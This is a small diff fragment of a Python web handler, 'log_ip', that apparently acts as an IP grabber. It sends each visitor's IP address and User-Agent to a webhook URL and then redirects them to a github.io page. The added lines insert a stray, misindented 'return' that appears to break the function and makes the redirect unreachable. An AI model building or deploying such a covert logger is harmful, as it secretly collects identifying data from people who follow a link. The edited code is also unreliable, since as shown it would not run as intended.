@@ -26,6 +26,9 @@ def log_ip():
     requests.post(WEBHOOK_URL, json={
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
+
+   return
+    
     time.sleep(10)
 
     return redirect("https://gengaog.github.io/-/")
